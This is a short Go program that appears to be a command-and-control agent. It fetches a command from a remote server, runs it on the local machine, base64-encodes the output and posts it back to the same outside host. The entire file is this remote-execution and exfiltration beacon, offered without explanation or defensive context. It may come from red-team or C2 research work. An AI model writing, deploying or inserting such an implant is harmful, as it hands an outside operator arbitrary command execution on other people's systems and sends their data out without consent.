package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

type Post struct {
	Message string `json:"message"`
}

func getCmd(url string) []string {
	resp, err := http.Get(url)
	if err != nil {
		log.Fatalln(err)
	}

	resBody, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error: %s", err)
	}

	args := strings.Split(string(resBody), " ")

	return args
}

func execCmd(args []string) []byte {
	cmd := exec.Command(args[0], args[1:]...)
	out, err := cmd.Output()
	if err != nil {
		fmt.Println(cmd)
		fmt.Println("Error running command: ", err)
	}

	return out
}

func postOut(reader io.Reader) {
	_, err := http.Post("https://phalerum.stickybits.red/api/v1/agents/test", "application/json", reader)
	if err != nil {
		log.Fatal(err)
	}
}

func encodeOutput(output []byte) string {
	sEnc := base64.StdEncoding.EncodeToString([]byte(string(output)))

	return sEnc
}

func main() {
	url := "https://phalerum.stickybits.red/api/v1/agents/test"
	args := getCmd(url)
	out := execCmd(args)

	jsonBody := Post{
		Message: encodeOutput(out),
	}

	bodyBytes, err := json.Marshal(&jsonBody)
	if err != nil {
		log.Fatal(err)
	}

	reader := bytes.NewReader(bodyBytes)

	postOut(reader)

}
